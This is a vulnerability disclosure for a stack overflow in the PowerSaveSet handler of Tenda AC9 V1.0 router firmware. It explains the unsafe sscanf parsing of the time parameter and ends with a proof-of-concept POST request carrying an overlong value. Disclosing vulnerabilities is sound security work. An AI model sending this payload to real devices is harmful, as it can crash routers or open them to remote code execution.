# Tenda AC9 V1.0 V15.03.05.14_multi stack overflow vulnerability
## Affected Version
Tenda AC9 V1.0 V15.03.05.14_multi
## Vulnerability Description
In Tenda ac9 v1.0 routers with firmware version V15.03.05.14_multi, the time parameter of route /goform/PowerSaveSet has a stack overflow vulnerability, which can lead to remote arbitrary code execution.
## Vulnerability Detail
There is a stack overflow vulnerability in the setSmartPowerManagement function in Tenda AC9 V1.0 firmware V15.03.05.14_multi.This function accepts the time parameter from a POST request by variable v24.However, since the user has control over the input of time, and sscanf() simply parses the data in the format specified by format and stores it directly into the target variable，the statement "sscanf(v24, "%[^:]:%[^-]-%[^:]:%s", &v20, &v18, &v16, &v14);  " may leads to a buffer overflow.  The user-supplied time can exceed the capacity of the  v6  array, thus triggering this security vulnerability.

![img](./img/PowerSaveSet.png)

## Poc
```py
POST /goform/PowerSaveSet HTTP/1.1
Host: 192.168.0.1
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
Cookie: password=452b97084f53fd461f33687a27a21f4dpxatgb

time=00:10-1:8888888888888888888888888888888888888888888888888888888
```
